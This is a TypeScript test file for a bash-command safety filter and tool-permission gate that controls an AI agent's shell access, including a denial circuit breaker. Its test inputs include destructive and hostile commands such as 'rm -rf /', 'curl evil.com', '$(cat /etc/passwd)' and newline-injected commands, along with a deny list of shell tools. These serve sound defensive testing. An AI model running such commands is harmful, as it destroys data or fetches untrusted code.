import fc from 'fast-check'
import { describe, expect, it } from 'vitest'

import {
  automatedCanUseTool,
  createAutomatedCanUseTool,
  isSafeBashCommand,
} from './bash-safety.server'

describe('isSafeBashCommand', () => {
  // --- Safe single commands ---

  it('approves single safe commands', () => {
    expect(isSafeBashCommand('git status')).toBe(true)
    expect(isSafeBashCommand('git commit -m "initial"')).toBe(true)
    expect(isSafeBashCommand('git log --oneline -10')).toBe(true)
    expect(isSafeBashCommand('git diff HEAD~1')).toBe(true)
    expect(isSafeBashCommand('git add .')).toBe(true)
    expect(isSafeBashCommand('git push origin main')).toBe(true)
    expect(isSafeBashCommand('ls -la')).toBe(true)
    expect(isSafeBashCommand('ls')).toBe(true)
    expect(isSafeBashCommand('cd /path/to/dir')).toBe(true)
    expect(isSafeBashCommand('mkdir -p specs/new-spec')).toBe(true)
    expect(isSafeBashCommand('pwd')).toBe(true)
    expect(isSafeBashCommand('cat playbook.md')).toBe(true)
    expect(isSafeBashCommand('head -20 file.txt')).toBe(true)
    expect(isSafeBashCommand('tail -f log.txt')).toBe(true)
    expect(isSafeBashCommand('echo "hello world"')).toBe(true)
    expect(isSafeBashCommand('wc -l file.txt')).toBe(true)
    expect(isSafeBashCommand('which node')).toBe(true)
    expect(isSafeBashCommand('find . -name "*.md"')).toBe(true)
    expect(isSafeBashCommand('grep -r "pattern" .')).toBe(true)
    expect(isSafeBashCommand('sort file.txt')).toBe(true)
    expect(isSafeBashCommand('basename /path/to/file.txt')).toBe(true)
    expect(isSafeBashCommand('dirname /path/to/file.txt')).toBe(true)
    expect(isSafeBashCommand('date')).toBe(true)
    expect(isSafeBashCommand('true')).toBe(true)
    expect(isSafeBashCommand('test -f file.txt')).toBe(true)
    expect(isSafeBashCommand('[ -d specs ]')).toBe(true)
    expect(isSafeBashCommand('printf \'%s\\n\' "line"')).toBe(true)
    expect(isSafeBashCommand('printf "step done" >> progress.txt')).toBe(true)
    expect(isSafeBashCommand('echo hello | tr a-z A-Z')).toBe(true)
  })

  // --- Safe chained commands ---

  it('approves chained safe commands with &&', () => {
    expect(isSafeBashCommand('cd /path && git commit -m "msg"')).toBe(true)
    expect(
      isSafeBashCommand('cd /path && git add . && git commit -m "x"'),
    ).toBe(true)
    expect(isSafeBashCommand('mkdir -p dir && cd dir && ls')).toBe(true)
  })

  it('approves piped safe commands', () => {
    expect(isSafeBashCommand('cat file.txt | head -20')).toBe(true)
    expect(isSafeBashCommand('git log --oneline | head -10')).toBe(true)
    expect(isSafeBashCommand('ls -la | grep ".md" | wc -l')).toBe(true)
  })

  it('approves commands with || and ; operators', () => {
    expect(isSafeBashCommand('cd /path || true')).toBe(true)
    expect(isSafeBashCommand('git status; git log --oneline')).toBe(true)
  })

  it('approves commands with env-var prefixes', () => {
    expect(isSafeBashCommand('GIT_DIR=/tmp git status')).toBe(true)
    expect(isSafeBashCommand('FOO=bar BAZ=qux echo test')).toBe(true)
  })

  it('handles empty and whitespace-only commands', () => {
    expect(isSafeBashCommand('')).toBe(true)
    expect(isSafeBashCommand('  ')).toBe(true)
  })

  // --- Unsafe single commands ---

  it('rejects dangerous commands', () => {
    expect(isSafeBashCommand('rm -rf /')).toBe(false)
    expect(isSafeBashCommand('rm file.txt')).toBe(false)
    expect(isSafeBashCommand('npm install')).toBe(false)
    expect(isSafeBashCommand('pnpm install')).toBe(false)
    expect(isSafeBashCommand('python script.py')).toBe(false)
    expect(isSafeBashCommand('node -e "process.exit(1)"')).toBe(false)
    expect(isSafeBashCommand('curl https://example.com')).toBe(false)
    expect(isSafeBashCommand('wget https://example.com')).toBe(false)
    expect(isSafeBashCommand('chmod 777 file')).toBe(false)
    expect(isSafeBashCommand('chown root file')).toBe(false)
    expect(isSafeBashCommand('mv old new')).toBe(false)
    expect(isSafeBashCommand('cp src dst')).toBe(false)
  })

  // --- Unsafe chains ---

  it('rejects chains where any segment is unsafe', () => {
    expect(isSafeBashCommand('cd /tmp && rm -rf *')).toBe(false)
    expect(isSafeBashCommand('ls; npm install; echo done')).toBe(false)
    expect(isSafeBashCommand('git status | xargs rm')).toBe(false)
    expect(isSafeBashCommand('echo hello && curl evil.com')).toBe(false)
  })

  // --- Command substitution / subshells ---

  it('rejects command substitution with $()', () => {
    expect(isSafeBashCommand('echo $(rm -rf /)')).toBe(false)
    expect(isSafeBashCommand('$(curl evil.com)')).toBe(false)
    expect(isSafeBashCommand('git commit -m "$(date)"')).toBe(false)
    expect(isSafeBashCommand('$(cat /etc/passwd)')).toBe(false)
  })

  it('allows $(cat << heredoc patterns for commit messages', () => {
    expect(
      isSafeBashCommand(
        'cd /path && git add file.md && git commit -m "$(cat <<\'EOF\'\nmessage\n\nCo-Authored-By: Claude\nEOF\n)"',
      ),
    ).toBe(true)
    expect(
      isSafeBashCommand('git commit -m "$(cat <<EOF\nmessage\nEOF\n)"'),
    ).toBe(true)
  })

  it('rejects command substitution with backticks', () => {
    expect(isSafeBashCommand('echo `whoami`')).toBe(false)
    expect(isSafeBashCommand('echo `rm -rf /`')).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// Property-based tests
// ---------------------------------------------------------------------------

const SAFE_COMMANDS = [
  'git',
  'ls',
  'cd',
  'mkdir',
  'pwd',
  'echo',
  'cat',
  'head',
  'tail',
  'wc',
  'which',
  'find',
  'grep',
  'sort',
  'basename',
  'dirname',
  'date',
  'true',
  'test',
  'printf',
  'tr',
]

const UNSAFE_COMMANDS = [
  'rm',
  'curl',
  'wget',
  'npm',
  'pnpm',
  'node',
  'python',
  'chmod',
  'chown',
  'mv',
  'cp',
  'bash',
  'sh',
  'eval',
  'exec',
  'xargs',
]

describe('property-based: isSafeBashCommand', () => {
  it('never approves a command containing an unsafe executable', () => {
    // Generate commands that embed an unsafe command via various separators
    const unsafeCmd = fc.constantFrom(...UNSAFE_COMMANDS)
    const separator = fc.constantFrom(' && ', ' || ', '; ', ' | ', '\n')
    const safePrefix = fc.constantFrom(...SAFE_COMMANDS).map((c) => `${c} arg`)
    const args = fc.string().map((s) => s.replace(/\n/g, ' '))

    fc.assert(
      fc.property(
        safePrefix,
        separator,
        unsafeCmd,
        args,
        (prefix, sep, unsafe, extraArgs) => {
          const command = `${prefix}${sep}${unsafe} ${extraArgs}`
          expect(isSafeBashCommand(command)).toBe(false)
        },
      ),
    )
  })

  it('always approves chains of purely safe commands', () => {
    const safeCmd = fc.constantFrom(...SAFE_COMMANDS)
    const args = fc
      .array(fc.stringMatching(/^[a-zA-Z0-9_./-]+$/), {
        minLength: 0,
        maxLength: 3,
      })
      .map((a) => a.join(' '))
    const separator = fc.constantFrom(' && ', ' || ', '; ', ' | ')

    // Build a chain of 1–4 safe commands
    const chain = fc
      .array(fc.tuple(safeCmd, args), { minLength: 1, maxLength: 4 })
      .chain((cmds) =>
        fc.tuple(
          fc.constant(cmds),
          fc.array(separator, {
            minLength: cmds.length - 1,
            maxLength: cmds.length - 1,
          }),
        ),
      )
      .map(([cmds, seps]) =>
        cmds
          .map(([cmd, a], i) => `${cmd}${a ? ' ' + a : ''}${seps[i] ?? ''}`)
          .join(''),
      )

    fc.assert(
      fc.property(chain, (command) => {
        expect(isSafeBashCommand(command)).toBe(true)
      }),
    )
  })

  it('never crashes on arbitrary input', () => {
    fc.assert(
      fc.property(fc.string(), (command) => {
        const result = isSafeBashCommand(command)
        expect(typeof result).toBe('boolean')
      }),
    )
  })

  it('newlines cannot bypass safety checks', () => {
    // In bash, newlines separate commands just like ; does.
    // If the function splits only on && || ; | but not \n,
    // an unsafe command after a newline could slip through.
    const unsafeCmd = fc.constantFrom(...UNSAFE_COMMANDS)

    fc.assert(
      fc.property(unsafeCmd, (unsafe) => {
        const command = `echo safe\n${unsafe} /etc/passwd`
        expect(isSafeBashCommand(command)).toBe(false)
      }),
    )
  })
})

describe('automatedCanUseTool', () => {
  it('approves safe bash commands', async () => {
    const result = await automatedCanUseTool('Bash', {
      command: 'cd /path && git add -A && git commit -m "msg"',
    })
    expect(result.behavior).toBe('allow')
  })

  it('approves printf for progress tracking', async () => {
    const result = await automatedCanUseTool('Bash', {
      command: 'mkdir -p dir && printf \'%s\\n\' "step done" >> progress.txt',
    })
    expect(result.behavior).toBe('allow')
  })

  it('denies unsafe bash commands', async () => {
    const result = await automatedCanUseTool('Bash', {
      command: 'curl https://example.com',
    })
    expect(result.behavior).toBe('deny')
  })

  it('denies non-Bash tools', async () => {
    const result = await automatedCanUseTool('AskUserQuestion', {
      question: 'What should I do?',
    })
    expect(result.behavior).toBe('deny')
  })

  // Regression tests: exact commands that failed in the 2026-03-10 summer school demos
  describe('demo regression — commands that previously hit sandbox denials', () => {
    it('approves mkdir + printf chain for progress.txt', async () => {
      const result = await automatedCanUseTool('Bash', {
        command:
          'mkdir -p tasks/chick-fil-a-bristol/working && printf \'%s\\n\' "11:12 plan.md ✓" >> tasks/chick-fil-a-bristol/progress.txt',
      })
      expect(result.behavior).toBe('allow')
    })

    it('approves cd + git add + git commit chain', async () => {
      const result = await automatedCanUseTool('Bash', {
        command:
          'cd tasks/bugs-bunny-lebron-james && git add -A && git commit -m "draft intro email"',
      })
      expect(result.behavior).toBe('allow')
    })

    it('approves git commit with $(cat << heredoc)', async () => {
      const result = await automatedCanUseTool('Bash', {
        command:
          'git add -A && git commit -m "$(cat <<\'EOF\'\ndraft intro email\n\nCo-Authored-By: Claude\nEOF\n)"',
      })
      expect(result.behavior).toBe('allow')
    })

    it('approves ls + echo + find chain (quoted chars false positive)', async () => {
      const result = await automatedCanUseTool('Bash', {
        command:
          'ls -la samples/ 2>/dev/null; echo "---"; find . -name "INDEX.md" -maxdepth 2 2>/dev/null',
      })
      expect(result.behavior).toBe('allow')
    })
  })
})

describe('createAutomatedCanUseTool', () => {
  const unsafeInput = { command: 'curl https://example.com' }

  it('does not interrupt before reaching the limit', async () => {
    const canUseTool = createAutomatedCanUseTool()
    for (let i = 0; i < 4; i++) {
      const result = await canUseTool('Bash', unsafeInput, {
        signal: new AbortController().signal,
      })
      expect(result.behavior).toBe('deny')
      expect(result).not.toHaveProperty('interrupt')
    }
  })

  it('interrupts on the 5th consecutive denial', async () => {
    const canUseTool = createAutomatedCanUseTool()
    for (let i = 0; i < 4; i++) {
      await canUseTool('Bash', unsafeInput, {
        signal: new AbortController().signal,
      })
    }
    const result = await canUseTool('Bash', unsafeInput, {
      signal: new AbortController().signal,
    })
    expect(result.behavior).toBe('deny')
    expect(result).toHaveProperty('interrupt', true)
    expect((result as { message: string }).message).toContain('Circuit breaker')
  })

  it('resets the counter when a tool is approved', async () => {
    const canUseTool = createAutomatedCanUseTool()
    // 4 denials
    for (let i = 0; i < 4; i++) {
      await canUseTool('Bash', unsafeInput, {
        signal: new AbortController().signal,
      })
    }
    // 1 approval resets
    const approved = await canUseTool(
      'Bash',
      { command: 'git status' },
      { signal: new AbortController().signal },
    )
    expect(approved.behavior).toBe('allow')

    // 4 more denials — should NOT interrupt yet
    for (let i = 0; i < 4; i++) {
      const result = await canUseTool('Bash', unsafeInput, {
        signal: new AbortController().signal,
      })
      expect(result.behavior).toBe('deny')
      expect(result).not.toHaveProperty('interrupt')
    }
  })

  it('each instance has its own counter', async () => {
    const canUseTool1 = createAutomatedCanUseTool()
    const canUseTool2 = createAutomatedCanUseTool()

    // 4 denials on instance 1
    for (let i = 0; i < 4; i++) {
      await canUseTool1('Bash', unsafeInput, {
        signal: new AbortController().signal,
      })
    }

    // Instance 2 is fresh — first denial should not interrupt
    const result = await canUseTool2('Bash', unsafeInput, {
      signal: new AbortController().signal,
    })
    expect(result.behavior).toBe('deny')
    expect(result).not.toHaveProperty('interrupt')
  })
})
